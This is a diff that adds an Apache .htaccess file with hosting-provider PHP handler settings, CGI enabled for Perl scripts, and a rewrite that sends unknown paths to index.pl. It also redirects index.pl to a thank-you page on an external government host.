@@ -1,0 +1,26 @@
+# BEGIN (mt) controlled settings
+<IfModule !mod_fcgid.c>
+  AddHandler php-stable .php
+</IfModule>
+<IfModule mod_fcgid.c>
+  AddHandler fcgid-script .php
+  FcgidWrapper /etc/apache2/gs-bin/php-stable-wrapper .php
+  <Files *.php>
+    Options +ExecCGI
+  </Files>
+</IfModule>
+# END (mt) controlled settings
+
+DirectoryIndex index.pl
+AddHandler cgi-script .cgi .pl
+Redirect /index.pl http://fomac.icm.gob.mx/gracias.html
+
+Options +ExecCGI
+Order allow,deny
+Allow from all
+RewriteEngine On
+
+RewriteBase /
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^ /index.pl [L]
